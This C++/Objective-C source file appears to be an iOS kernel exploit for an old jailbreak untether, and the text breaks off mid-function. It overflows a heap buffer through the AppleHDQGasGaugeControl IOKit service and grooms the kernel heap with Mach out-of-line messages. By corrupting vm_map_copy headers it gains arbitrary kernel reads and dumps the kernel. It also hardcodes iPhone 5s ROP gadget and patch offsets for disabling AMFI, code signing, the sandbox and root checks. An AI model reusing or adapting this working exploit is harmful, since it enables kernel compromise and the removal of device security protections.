
#include <Foundation/Foundation.h>
#include <mach-o/dyld.h>
#include <mach/mach.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <copyfile.h>
#include <pthread.h>

#include <spawn.h>
extern char **environ;

//#include "patchfinder_64.h"

#pragma mark -
#pragma mark IOKit

extern "C" {

	typedef mach_port_t io_object_t;
	typedef io_object_t io_connect_t;
	typedef io_object_t io_service_t;
	typedef io_object_t io_iterator_t;

	extern const mach_port_t kIOMasterPortDefault;

	kern_return_t
	IOConnectTrap1(
				   io_connect_t	connect,
				   unsigned int	index,
				   uintptr_t		p1 );

	kern_return_t
	IOConnectTrap5(
				   io_connect_t	connect,
				   unsigned int	index,
				   uintptr_t 	p1,
				   uintptr_t 	p2,
				   uintptr_t	p3,
				   uintptr_t	p4,
				   uintptr_t	p5 );

	kern_return_t
	IOConnectCallMethod(
						mach_port_t		connection,			// In
						uint32_t		selector,			// In
						const uint64_t*	input,				// In
						uint32_t		inputCnt,			// In
						const void*		inputStruct,		// In
						size_t			inputStructCnt,		// In
						uint64_t*		output,				// Out
						uint32_t*		outputCnt,			// In/Out
						void*			outputStruct,		// Out
						size_t*			outputStructCntP);	// In/Out

	CFMutableDictionaryRef IOServiceMatching(const char *serviceName);
	kern_return_t IOServiceGetMatchingServices( mach_port_t masterPort, CFDictionaryRef matching, io_iterator_t *existing );

	io_object_t IOIteratorNext( io_iterator_t iterator );

	kern_return_t IOServiceOpen( io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *connect );
	kern_return_t IOServiceWaitQuiet( io_service_t service, mach_timespec_t *waitTime );
	kern_return_t IOServiceClose( io_connect_t connect );
}

#if __LP64__
	#define UNTETHER_FULL
#else
	#define	UNTETHER_AMFI
#endif

#define WaitForLog() { usleep(10 * 1000); }
#define UTZLog(format, ...) { NSLog(format, ##__VA_ARGS__); WaitForLog(); }

#pragma mark -
#pragma mark mach_msg structuress

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_trailer_t trailer;
} oolmsg_t;

static const uint32_t MACH_IPC_SEND_MOD	= (err_mach_ipc|err_sub(0));
static const uint32_t MACH_IPC_RCV_MOD	= (err_mach_ipc|err_sub(1));
static const uint32_t MACH_IPC_MIG_MOD	= (err_mach_ipc|err_sub(2));

#pragma mark -
#pragma mark vm_map_copy structure

static const uint32_t VM_MAP_COPY_ENTRY_LIST	= 1;
static const uint32_t VM_MAP_COPY_OBJECT		= 2;
static const uint32_t VM_MAP_COPY_KERNEL_BUFFER	= 3;

using kern_uint_t = uint64_t;

#pragma pack(4)
struct vm_map_copy
{
	uint32_t type;
	uint32_t deadbeef;
	kern_uint_t offset;
	kern_uint_t size;
	kern_uint_t kdata;
	kern_uint_t kalloc_size;
};

static const uint32_t kVMMapCopySize = 0x58;

#pragma mark -
#pragma mark mach IO operations

static const uint32_t	kMachMsgDataSize = sizeof(oolmsg_t) + 0x2000;

static mach_port_t MachCopyinData(uint8_t* bytes, size_t size)
{
	mach_port_t port = 0;
	uint8_t msgdata[kMachMsgDataSize] = {0};
	oolmsg_t *msg=(oolmsg_t*)&msgdata[0];
	
	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
	mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
	
	msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
	msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
	msg->header.msgh_remote_port = port;
	msg->header.msgh_local_port = MACH_PORT_NULL;
	msg->header.msgh_size = sizeof(oolmsg_t);
	msg->header.msgh_id = 1;
	msg->body.msgh_descriptor_count = 1;
	msg->desc.address = (void *)bytes;
	msg->desc.size = size;
	msg->desc.type = MACH_MSG_OOL_DESCRIPTOR;
	
	mach_msg_return_t ret = mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
	if (ret != MACH_MSG_SUCCESS)
	{
		UTZLog(@"[ERR:MCH] copyinData() failed with %.8X", ret);
		return -1;
	}
	
	return port;
}

static uint8_t* MachCopyoutData(mach_port_t port, mach_vm_size_t* size = nullptr)
{
	uint8_t	msgdata[kMachMsgDataSize] = {0};
	oolmsg_t *msg=(oolmsg_t *)&msgdata[0];
	
	mach_msg_return_t ret = mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG, 0, kMachMsgDataSize, port, 0, MACH_PORT_NULL);
	if(ret == MACH_MSG_SUCCESS)
	{
		if (size != nullptr)
			*size = msg->desc.size;
		return (uint8_t*)msg->desc.address;
	}
	else if (ret == (MACH_IPC_RCV_MOD | MACH_MSG_VM_SPACE | ENOMEM))
	{
		UTZLog(@"[ERR:MCH] copyoutData() no space <%d|%d|%d>", err_get_system(ret), err_get_sub(ret), err_get_code(ret));
	}
	else
	{
		UTZLog(@"[ERR:MCH] copyoutData() failed <%d|%d|%d>", err_get_system(ret), err_get_sub(ret), err_get_code(ret));
	}
	
	return nullptr;
}

static bool MachDeallocate(mach_port_t port)
{
	kern_return_t kernStatus = mach_port_deallocate(mach_task_self(), port);
	if (kernStatus != KERN_SUCCESS)
	{
		UTZLog(@"[ERR:MCH] mach_port_deallocate() failed with %.8X", kernStatus);
		return false;
	}
	
	return true;
}

template <uint32_t ITEM_COUNT, uint32_t ZONE>
struct MachDataIO
{
	static const uint32_t kZoneElementSize = ZONE;
	static const uint32_t kZoneElementDataSize = ZONE - kVMMapCopySize;
	
	static const uint32_t	kInvalidPort = 0;
	
	enum class PortState : uint32_t
	{
		Filled,
		Empty
	};
	
	mach_port_t		m_items[ITEM_COUNT];
	PortState		m_states[ITEM_COUNT];
	uint32_t		m_curIndex = 0;
	uint8_t			m_itemData[(ITEM_COUNT * sizeof(uint16_t)) + ((kZoneElementSize*2) - kVMMapCopySize) - sizeof(uint16_t)];
	uint16_t*		m_itemIndices = (uint16_t*)&m_itemData[0];

	// ***
	
	template<typename Functor>
	void for_all_items(Functor functor)
	{
		for (uint32_t i=0; i < ITEM_COUNT; i++)
		{
			functor(i);
		}
	}
	
	MachDataIO()
	{
		for_all_items([this](uint32_t idx) {
			m_items[idx] = kInvalidPort;
			m_states[idx] = PortState::Empty;
			m_itemIndices[idx] = idx;
		});
	}

	bool portExists(uint32_t idx)
	{
		return (m_items[idx] != kInvalidPort);
	}
	
	bool portHasData(uint32_t idx)
	{
		if (portExists(idx) == false)
			return false;
		
		return (m_states[idx] != PortState::Empty);
	}
	
	mach_port_t exportPort(uint32_t idx)
	{
		if (portExists(idx) == false)
			return false;

		mach_port_t tmp = m_items[idx];
		m_items[idx] = kInvalidPort;
		m_states[idx] = PortState::Empty;
		
		return tmp;
	}
	
	void allocIndexedItems()
	{
		for_all_items([this](uint32_t idx) {
			copyinDataNext((uint8_t*)(m_itemIndices + idx), kZoneElementSize - kVMMapCopySize);
		});
	}

	bool reallocItemAt(uint32_t idx, uint8_t* bytes, size_t size)
	{
		mach_port_t newPort = MachCopyinData(bytes, size);
		if (newPort == -1)
			return false;

		deallocate(idx);
		m_items[idx] = newPort;
		m_states[idx] = PortState::Filled;
		return true;
	}

	bool copyinDataNext(uint8_t* bytes, size_t size)
	{
		mach_port_t newPort = MachCopyinData(bytes, size);
		if (newPort == -1)
			return false;
		
		m_items[m_curIndex] = newPort;
		m_states[m_curIndex] = PortState::Filled;
		m_curIndex++;
		return true;
	}
	
	uint8_t* copyoutDataFrom(uint32_t idx, mach_vm_size_t* size = nullptr)
	{
		
		if (m_items[idx] == kInvalidPort)
			return nullptr;

		if (m_states[idx] == PortState::Empty)
			return nullptr;

		uint8_t* data = MachCopyoutData(m_items[idx]);
		if (data == nullptr)
		{
			UTZLog(@"[ERR:MIO] copyoutDataFrom(%d) failed", idx);
			m_items[idx] = kInvalidPort;
		}
		
		m_states[idx] = PortState::Empty;
		
		return data;
	}
	
	bool deallocate(uint32_t idx)
	{
		if (m_items[idx] == kInvalidPort)
			return false;
		
		bool ret = MachDeallocate(m_items[idx]);
		if (ret == false)
			UTZLog(@"[ERR:MIO] deallocate(%d) failed", idx);
		
		m_items[idx] = kInvalidPort;
		m_states[idx] = PortState::Empty;
		
		return ret;
	}
	
	void cleanup()
	{
		for_all_items([this] (uint32_t idx) {
			copyoutDataFrom(idx);
			deallocate(idx);
		});
		
		m_curIndex = 0;
	}
};

#pragma mark -
#pragma mark CPUExerciser

template <uint32_t THREAD_COUNT>
struct CPUExerciser
{
	bool m_running = false;
	
	pthread_t m_thread[THREAD_COUNT];
	
	// ***
	
	static void* s_thread_func(void* ctx) { return ((CPUExerciser*)ctx)->exercise(); }
	
	void* exercise()
	{
		volatile float number = 1.5;
		while(m_running)
		{
			number *= number;
		}
		return nullptr;
	}
	
	void start()
	{
		m_running = true;

		for (uint32_t i=0; i < THREAD_COUNT; i++)
			pthread_create(&m_thread[i], NULL, s_thread_func, this);
	}
	
	void stop()
	{
		m_running = false;
		
		for (uint32_t i=0; i < THREAD_COUNT; i++)
			pthread_join(m_thread[i], NULL);
		
		m_running = true;
	}
};

#pragma mark -
#pragma mark GasGaugeService

static const uint32_t kGasGaugeVtable_requestPowerDomainState	= 147;
static const uint32_t kGasGaugeVtable_getExternalTrapForIndex	= 183;

struct GasGaugeService
{
	io_connect_t connect = -1;
	io_service_t gasGaugeService;
	
	// ***
	
	GasGaugeService()
	{
		io_iterator_t iterator;
		
		IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("AppleHDQGasGaugeControl"), &iterator);
		gasGaugeService = IOIteratorNext(iterator);
	}
	
	void open()
	{
		kern_return_t err = IOServiceOpen(gasGaugeService, mach_task_self(), 0, &connect);
		
		assert(err == KERN_SUCCESS);
	}
	
	void prepareData(uint8_t* inData, uint32_t bytes)
	{
		int totalElements = bytes/8;
		for (int i = 0; i < totalElements; i++) {
			*(uint32_t *)&inData[4 + (i*8)] = 1; // fill elements with { size:0, flags:1 }
		}
		*(uint32_t *)&inData[4+((totalElements-1)*8)] = 0xFFFFFFFF;  // indicate end
	}
	
	void exploit(uint8_t* inData, uint32_t bytes)
	{
		uint64_t inputScalar = 0;
		IOConnectCallMethod(connect, 12, &inputScalar, 1, inData, bytes, 0, 0, 0, 0);
	}
	
	uint32_t callIndex0Trap5(uintptr_t arg1, uintptr_t arg2, uintptr_t arg3, uintptr_t arg4, uintptr_t arg5)
	{
		return IOConnectTrap5(connect, 0, arg1, arg2, arg3, arg4, arg5);
	}
	
	uint32_t callIndex0Trap1(uintptr_t arg1)
	{
		return IOConnectTrap1(connect, 0, 0);
	}
	
	void wait()
	{
		mach_timespec_t wt;
		wt.tv_nsec = 100*000;
		wt.tv_sec = 1;
		
		IOServiceWaitQuiet(gasGaugeService, &wt);
	}
	
	void close()
	{
		if (connect != -1)
		{
			IOServiceClose(connect);
			connect = -1;
		}
	}
};

#pragma mark -
#pragma mark KernelReader

template <uint32_t ZONE>
struct KernelReader
{
	static const uint32_t kCurrentZone = ZONE;
	static const uint32_t kPoisonedZone = ZONE * 2;
	static const uint32_t kZoneElementSize = ZONE;
	static const uint32_t kZoneElementDataSize = kZoneElementSize - kVMMapCopySize;
	
	GasGaugeService m_service;
	mach_port_t		m_parentPort = -1;
	mach_port_t		m_childPort = -1;
	
	//              zone:    ... |    IOMalloc     |      parent      |      child      | ...
	uint8_t			m_overlapData[kZoneElementSize + kZoneElementSize + kZoneElementSize] = {0};
	
	vm_map_copy*	m_parentHeader = (vm_map_copy*)&m_overlapData[kZoneElementSize];
	uint8_t*		m_parentData = &m_overlapData[kZoneElementSize + kVMMapCopySize];
	kern_uint_t		m_parentDataAddress = 0;
	
	vm_map_copy*	m_childHeader = (vm_map_copy*)&m_overlapData[kZoneElementSize * 2];
	uint8_t*		m_childData = &m_overlapData[(kZoneElementSize * 2) + kVMMapCopySize];
	kern_uint_t		m_childDataAddress = 0;
	
	// ***
	
	KernelReader()
	{}
	
	bool init(GasGaugeService service, mach_port_t parentPort, mach_port_t childPort)
	{
		m_service = service;
		m_parentPort = parentPort;
		m_childPort = childPort;
		
		m_service.prepareData(m_overlapData, kZoneElementSize);

		// realloc child element with magic
		*((uint32_t*)m_childData) = 0xA1B2C3D4;
		m_childPort = reallocPort(m_childPort, m_childData, kZoneElementDataSize);
		if (m_childPort == -1)
			return false;

		*((uint32_t*)m_childData) = 0x0;

		// prepare overlapped header
		m_parentHeader->type		= VM_MAP_COPY_KERNEL_BUFFER;
		m_parentHeader->deadbeef	= 0xdeadbeef;
		m_parentHeader->offset		= 0x0;
		m_parentHeader->size		= kZoneElementDataSize + kVMMapCopySize + sizeof(uint32_t); // current data + next elements header + magic of second
		m_parentHeader->kdata		= 0; // will be calculated below
		m_parentHeader->kalloc_size	= kCurrentZone;
		
		// reopen service and trigger exploit
		m_service.close();
		m_service.open();
		m_service.wait();
		// overlap: 'type' + 'deadbeef' + 'offset' + 'size' = 4 + 4 + 8 + 8
		m_service.exploit(m_overlapData, kZoneElementSize + 4+4+8+8);

		// get child data
		uint8_t* data = nullptr;
		m_parentPort = reallocPort(m_parentPort, m_parentData, kZoneElementDataSize, &data);
		if (m_parentPort == -1)
			return false;

		// make sure that we overlap child element
		uint32_t magic = *((uint32_t*)&data[kZoneElementDataSize + kVMMapCopySize]);
		if (magic != 0xA1B2C3D4)
			return false;
		
		// set child header
		memcpy(m_childHeader, &data[kZoneElementDataSize], kVMMapCopySize);
		m_childDataAddress = m_childHeader->kdata;
		
		// update parent header
		m_parentHeader->kdata = m_childHeader->kdata - kZoneElementSize;
		m_parentDataAddress = m_parentHeader->kdata;
		
		UTZLog(@"[INF:KRD] 0x%.16llX | 0x%.16llX", m_parentDataAddress, m_childDataAddress);
		
		return true;
	}
	
	template<typename Functor>
	bool replaceChildWithObject(uint32_t zone, Functor allocateObject)
	{
		m_parentHeader->kdata		= m_parentDataAddress;

		m_childHeader->type			= VM_MAP_COPY_KERNEL_BUFFER;
		m_childHeader->deadbeef		= 0xdeadbeef;
		m_childHeader->offset		= 0x0;
		m_childHeader->size			= kZoneElementSize - kVMMapCopySize;
		m_childHeader->kdata		= m_childDataAddress;
		m_childHeader->kalloc_size	= zone;

		// reopen service and trigger exploit
		m_service.close();
		m_service.open();
		m_service.wait();
		// overlap: parent + child header
		m_service.exploit(m_overlapData, kZoneElementSize + kZoneElementSize + kVMMapCopySize);
		
		// release child to poison zone
		releaseChild();

		allocateObject();
		
		return true;
	}
	
	template<typename Functor>
	bool replaceObjectWithChild(uint32_t zone, Functor deallocateObject)
	{
		deallocateObject();
		
		mach_port_t newPort = MachCopyinData(m_childData, zone - kVMMapCopySize);
		if (newPort == -1)
			return -1;

		m_childPort = newPort;
		
		m_childHeader->type			= VM_MAP_COPY_KERNEL_BUFFER;
		m_childHeader->deadbeef		= 0xdeadbeef;
		m_childHeader->offset		= 0x0;
		m_childHeader->size			= zone - kVMMapCopySize;
		m_childHeader->kdata		= m_childDataAddress;
		m_childHeader->kalloc_size	= kCurrentZone;
		
		// reopen service and trigger exploit
		m_service.close();
		m_service.open();
		m_service.wait();
		// overlap: parent + child header (return to current zone)
		m_service.exploit(m_overlapData, kZoneElementSize + kZoneElementSize + kVMMapCopySize);

		return true;
	}
	
	mach_port_t reallocPort(mach_port_t port, uint8_t* newData, uint32_t newSize, uint8_t** oldData = nullptr)
	{
		uint8_t* data = MachCopyoutData(port);
		if (data == nullptr)
			return -1;
		
		if (oldData != nullptr)
			*oldData = data;
		
		mach_port_t newPort = MachCopyinData(newData, newSize);
		if (newPort == -1)
			return -1;
		
		MachDeallocate(port);
		return newPort;
	}
	
	bool readParentData(uint8_t*& data)
	{
		m_parentPort = reallocPort(m_parentPort, m_parentData, kZoneElementDataSize, &data);
		if (m_parentPort == -1)
			return false;
		
		return true;
	}
	
	bool setParentDataDesc(uint64_t address, uint32_t size)
	{
		m_parentHeader->kdata = address;
		m_parentHeader->size = size;
		
		// reopen service and trigger exploit
		m_service.close();
		m_service.open();
		m_service.wait();
		// overlap: 'type' + 'deadbeef' + 'offset' + 'size' + 'kdata' = 4 + 4 + 8 + 8 + 8
		m_service.exploit(m_overlapData, kZoneElementSize + 4+4+8+8+8);
		
		return true;
	}
	
	bool writeParentData(uint8_t* data, uint32_t size)
	{
		if(size != m_parentHeader->size)
			return false;
		
		memcpy(m_parentData, data, size);
		
		m_parentPort = reallocPort(m_parentPort, m_parentData, size);
		if (m_parentPort == -1)
			return false;
		
		return true;
	}
	
	bool readChildData(uint8_t*& data)
	{
		m_childPort = reallocPort(m_childPort, m_childData, kZoneElementDataSize, &data);
		if (m_parentPort == -1)
			return false;
		
		return true;
	}
	
	bool writeChildData(uint8_t* data, uint32_t size)
	{
		if(size != m_childHeader->size)
			return false;
		
		memcpy(m_childData, data, size);
		
		m_childPort = reallocPort(m_childPort, m_childData, size);
		if (m_parentPort == -1)
			return false;
		
		return true;
	}
	
	uint64_t getParentDataAddress()
	{
		return m_parentDataAddress;
	}

	uint64_t getChildDataAddress()
	{
		return m_childDataAddress;
	}

	bool readArbitraryData(uint64_t address, uint32_t size, uint8_t*& data)
	{
		if (m_parentPort == -1)
			return false;

		setParentDataDesc(address, size);

		// get data and realloc second port
		m_parentPort = reallocPort(m_parentPort, m_parentData, kZoneElementDataSize, &data);
		if (m_parentPort == -1)
			return false;

		// restore header
		m_parentHeader->kdata = m_parentDataAddress;
		m_parentHeader->size = kZoneElementSize;
		
		return true;
	}
	
	uint8_t* getChildElement()
	{
		uint8_t* data = nullptr;
		readArbitraryData(m_childDataAddress - kVMMapCopySize, kZoneElementSize, data);
			
		return data;
	}

	bool overwriteElementsFromOffset(uint32_t offset, uint8_t* data, uint32_t size)
	{
		if ((kZoneElementSize + offset + size) > (kZoneElementSize * 3))
			return false;
			
		memcpy(m_overlapData + kZoneElementSize + offset, data, size);
		
		// reopen service and trigger exploit
		m_service.close();
		m_service.open();
		m_service.wait();
		m_service.exploit(m_overlapData, kZoneElementSize + kVMMapCopySize + size);
	}
	
	bool releaseParent()
	{
		if (m_parentPort != -1)
		{
			MachCopyoutData(m_parentPort);
			MachDeallocate(m_parentPort);
			m_parentPort = -1;
		}
	}
	
	bool releaseChild()
	{
		if(m_childPort != -1)
		{
			MachCopyoutData(m_childPort);
			MachDeallocate(m_childPort);
			m_childPort = -1;
		}
	}
	
	bool cleanup()
	{
		if(m_childPort != -1)
		{
			MachCopyoutData(m_childPort);
			MachDeallocate(m_childPort);
			m_childPort = -1;
		}

		if (m_parentPort != -1)
		{
			MachCopyoutData(m_parentPort);
			MachDeallocate(m_parentPort);
			m_parentPort = -1;
		}
	}
	
};

#pragma mark -
#pragma mark KernelDumper

template <uint32_t ZONE>
struct KernelDumper
{
	KernelReader<ZONE>*	m_kernelReader;
	uint64_t			m_kaslrSlide;
	FILE*				m_file = 0;
	
	bool init(KernelReader<ZONE>* kernelReader, uint64_t kaslr, bool dumpToFile = false)
	{
		m_kernelReader = kernelReader;
		m_kaslrSlide = kaslr;
		
		if (dumpToFile)
			m_file = fopen("/var/mobile/Media/kernel.dump", "w+");
	}
	
	bool dumpKernel(uint8_t*& kernelDump, uint32_t size)
	{
		if ((size & 0xFFF) != 0)
			return false;

		UTZLog(@"[INF:KDP] dumping kernel...");

		fseek(m_file, 0, SEEK_SET);
		
		for (int i = 0x0; i < size; i+=4096)
		{
			uint8_t* data;
			m_kernelReader->readArbitraryData(0xFFFFFF8002002000 + m_kaslrSlide + i, 4096, data);
			memcpy(kernelDump + i, data, 4096);
			if (m_file != 0)
				fwrite(&kernelDump[i], 1, 4096, m_file);
		}
		
		if (m_file != 0)
			fclose(m_file);
		
		UTZLog(@"[INF:KDP] kernel dump complete");
		
		return true;
	}
};

#pragma mark -
#pragma mark PatchFinder

struct PatchFinder
{
	uint64_t m_kernelBase = 0xFFFFFF8002002000;
	uint64_t m_kaslrSlide = 0;
	
	PatchFinder()
	{}
	
	// ADD		X0, X0, #232
	// RET
	uint64_t ADD_X0_232				= 0x0;
	
	// LDR		W0, [X8,W1,SXTW#2]
	// RET
	
	uint64_t LDR_X0_X8_W1_SXTW_2	= 0x0;
	
	// STRB		W1, [X8,W2,UXTW]
	// MOV		W0, #1
	// RET
	uint64_t STRB_W1_X8_W2_UXTW		= 0x0;
	
	// LDR		X0, [X1,#0x20]
	// RET
	uint64_t LDR_X0_X1_32			= 0x0;
	
	// STR		W3, [X1,W2,UXTW]
	// RET
	
	uint64_t STR_W3_X1_W2_UXTW		= 0x0;
	
	//
	
	uint64_t INVALIDATE_TLB			= 0x0;
	uint64_t FLUSHCACHE				= 0x0;
	uint64_t AMFI_GET_OUT_OF_MY_WAY = 0x0;
	uint64_t MOUNT_COMMON			= 0x0;
	uint64_t CS_ENFORCE				= 0x0;
	uint64_t VM_MAP_ENTER			= 0x0;
	uint64_t VM_MAP_PROTECT			= 0x0;
	uint64_t TFP0					= 0x0;
	uint64_t GET_R00T				= 0x0;
	uint64_t ICHDB_1				= 0x0;
	uint64_t ICHDB_2				= 0x0;
	uint64_t PROC_ENFORCE			= 0x0;
	uint64_t MAPIO					= 0x0;
	uint64_t SB_TRACE				= 0x0;
	//
	uint64_t KERNEL_PMAP			= 0x0;
	uint64_t PHYS_ADDR				= 0x0;
	
	bool init(uint64_t kaslr)
	{
		m_kaslrSlide = kaslr;
	}
	
	bool findPatchesForKernel(uint8_t* kernelDump)
	{
		// !!! PATCHFINDER CODE IS NOT AVAILABLE FOR PUBLIC !!!

//		INVALIDATE_TLB	= find_invalidate_tlb_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		FLUSHCACHE		= find_flush_dcache_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		
//		MOUNT_COMMON	= find_mount_common_patch_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		CS_ENFORCE		= find_cs_enforcement_disable_amfi_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		VM_MAP_ENTER	= find_vm_map_enter_patch_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		VM_MAP_PROTECT	= find_vm_map_protect_patch_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		TFP0			= find_tfp0_patch_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		GET_R00T		= find_setreuid_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		ICHDB_1			= find_i_can_has_debugger_1_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		ICHDB_1			= find_i_can_has_debugger_2_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		PROC_ENFORCE	= find_proc_enforce_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		MAPIO			= find_lwvm_mapio_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
//		SB_TRACE		= find_sb_backtrace_64(m_kernelBase + m_kaslrSlide, &kernelDump[0], 0x10000 * 256);
		
		// These are hardcoded offsets for iPhone 5s

		// gadgets
		ADD_X0_232				= m_kernelBase + m_kaslrSlide + 0xF586C;
		LDR_X0_X8_W1_SXTW_2		= m_kernelBase + m_kaslrSlide + 0x3834C8;
		STRB_W1_X8_W2_UXTW		= m_kernelBase + m_kaslrSlide + 0x3A13CC;
		LDR_X0_X1_32			= m_kernelBase + m_kaslrSlide + 0x3DA2AC;
		STR_W3_X1_W2_UXTW		= m_kernelBase + m_kaslrSlide + 0xED4670;
		//
		INVALIDATE_TLB			= m_kernelBase + m_kaslrSlide + 0xDEAD0;
		FLUSHCACHE				= m_kernelBase + m_kaslrSlide + 0xCDC84;
		//
		AMFI_GET_OUT_OF_MY_WAY	= m_kernelBase + m_kaslrSlide + 0x6AF290;
		MOUNT_COMMON			= m_kernelBase + m_kaslrSlide + 0x110ABC;
		CS_ENFORCE				= m_kernelBase + m_kaslrSlide + 0x6AF291;
		VM_MAP_ENTER			= m_kernelBase + m_kaslrSlide + 0x84648;
		VM_MAP_PROTECT			= m_kernelBase + m_kaslrSlide + 0x86298;
		TFP0					= m_kernelBase + m_kaslrSlide + 0x37C2B0;
		GET_R00T				= m_kernelBase + m_kaslrSlide + 0x314E98;
		ICHDB_1					= m_kernelBase + m_kaslrSlide + 0x526804;
		ICHDB_2					= m_kernelBase + m_kaslrSlide + 0x525EF4;
		PROC_ENFORCE			= m_kernelBase + m_kaslrSlide + 0xC4BEF64;
		MAPIO					= m_kernelBase + m_kaslrSlide + 0xFBDEEC;
		SB_TRACE				= m_kernelBase + m_kaslrSlide + 0xCC1750;
		//
		KERNEL_PMAP				= m_kernelBase + m_kaslrSlide + 0x4AA138;
		PHYS_ADDR				= m_kernelBase + m_kaslrSlide + 0x540040;

		return true;
	}
	
	void prinfOffsets()
	{
		UTZLog(@"[INF:PTF] ADD_X0_232             = 0x%.16llX",	ADD_X0_232);
		UTZLog(@"[INF:PTF] LDR_X0_X8_W1_SXTW_2    = 0x%.16llX",	LDR_X0_X8_W1_SXTW_2);
		UTZLog(@"[INF:PTF] STRB_W1_X8_W2_UXTW     = 0x%.16llX",	STRB_W1_X8_W2_UXTW);
		UTZLog(@"[INF:PTF] LDR_X0_X1_32           = 0x%.16llX",	LDR_X0_X1_32);
		UTZLog(@"[INF:PTF] STR_W3_X1_W2_UXTW      = 0x%.16llX",	STR_W3_X1_W2_UXTW);
		
		UTZLog(@"[INF:PTF] INVALIDATE_TLB         = 0x%.16llX", INVALIDATE_TLB);
		UTZLog(@"[INF:PTF] FLUSHCACHE             = 0x%.16llX", FLUSHCACHE);
		
		UTZLog(@"[INF:PTF] AMFI_GET_OUT_OF_MY_WAY = 0x%.16llX", AMFI_GET_OUT_OF_MY_WAY);
		UTZLog(@"[INF:PTF] MOUNT_COMMON           = 0x%.16llX", MOUNT_COMMON);
		UTZLog(@"[INF:PTF] CS_ENFORCE             = 0x%.16llX", CS_ENFORCE);
		UTZLog(@"[INF:PTF] VM_MAP_ENTER           = 0x%.16llX", VM_MAP_ENTER);
		UTZLog(@"[INF:PTF] VM_MAP_PROTECT         = 0x%.16llX", VM_MAP_PROTECT);
		UTZLog(@"[INF:PTF] TFP0                   = 0x%.16llX", TFP0);
		UTZLog(@"[INF:PTF] GET_R00T               = 0x%.16llX", GET_R00T);
		UTZLog(@"[INF:PTF] ICHDB_1                = 0x%.16llX", ICHDB_1);
		UTZLog(@"[INF:PTF] ICHDB_2                = 0x%.16llX", ICHDB_2);
		UTZLog(@"[INF:PTF] PROC_ENFORCE           = 0x%.16llX", PROC_ENFORCE);
		UTZLog(@"[INF:PTF] MAPIO                  = 0x%.16llX", MAPIO);
		UTZLog(@"[INF:PTF] SB_TRACE               = 0x%.16llX", SB_TRACE);

		UTZLog(@"[INF:PTF] KERNEL_PMA             = 0x%.16llX", KERNEL_PMAP);
		UTZLog(@"[INF:PTF] PHYS_ADDR              = 0x%.16llX", PHYS_ADDR);
	}
};

#pragma mark -
#pragma mark FindAdjacentElements

template <uint32_t ZONE>
bool FindAdjacentElements(GasGaugeService& ggService, mach_port_t& parentPort, mach_port_t& childPort)
{
	static const uint32_t GAP_BASE = ZONE + (ZONE / 4);
	static const uint32_t kZoneElementSize = ZONE;
	static const uint32_t kZoneElementDataSize = ZONE - kVMMapCopySize;
	static const uint32_t kSprayCount = ZONE * 2;
	
	UTZLog(@"[INF:FAE] looking for adjacent elements...");
	
	bool goodFound = false;
	bool badFound = false;
	
	MachDataIO<kSprayCount, ZONE>	machDataIO;
	
	static const uint32_t gaps[] = {
		GAP_BASE+0,  GAP_BASE+10, GAP_BASE+20, GAP_BASE+30, GAP_BASE+40,
		GAP_BASE+50, GAP_BASE+60, GAP_BASE+70, GAP_BASE+80, GAP_BASE+90,
	};
	static const uint32_t gap_cnt = sizeof(gaps) / sizeof(uint32_t);
	
	host_t host = mach_host_self();
	
	uint8_t oflow_data[kZoneElementSize * 3] = {0};
	struct vm_map_copy* oflow_msg = (struct vm_map_copy*) (&oflow_data[kZoneElementSize]);
	
	ggService.prepareData(oflow_data, kZoneElementSize);
	
	// prepare overlapped header
	oflow_msg->type		= VM_MAP_COPY_KERNEL_BUFFER;
	oflow_msg->deadbeef = 0xdeadbeef;
	oflow_msg->offset	= 0x0;
	oflow_msg->size		= kZoneElementDataSize + kVMMapCopySize + 4; // current data + next elements header + magic of second
	
	// fill heap with indexed items
	machDataIO.allocIndexedItems();
	
	// create gaps
	for (uint32_t i=0; i < gap_cnt; ++i)
		machDataIO.copyoutDataFrom(gaps[i]);

	// ...| h:copy | IOMalloc | h:copy | h:copy | ... - heap structure
	//             |-------------|                    - use exploit to overwrite vm_map_copy.sz of next copy
	
	// perform overlap (just 'type', 'deadbeef', 'offset' and 'size')
	ggService.exploit(oflow_data, kZoneElementSize + 4+4+8+8);
	
	// try to find tree copy items in row
	for (uint32_t i=0; i < kSprayCount; ++i)
	{
		if (machDataIO.portHasData(i) == true)
		{
			uint8_t* data = machDataIO.copyoutDataFrom(i);
			if (data != nullptr)
			{
				uint32_t nextMagic = *((uint32_t*)&data[kZoneElementDataSize]);
				
				// validate 'first'
				if (nextMagic == VM_MAP_COPY_KERNEL_BUFFER)
				{
					machDataIO.reallocItemAt(i, data, kZoneElementDataSize);
					
					uint16_t baseId = *((uint16_t*)(&data[0]));
					uint16_t nextId = *((uint16_t*)(&data[kZoneElementDataSize + kVMMapCopySize]));

					UTZLog(@"[INF:FAE] %d: [ IOMalloc ][ %4d ][ %4d ]", i, baseId, nextId);

					parentPort = machDataIO.exportPort(baseId);
					childPort = machDataIO.exportPort(nextId);

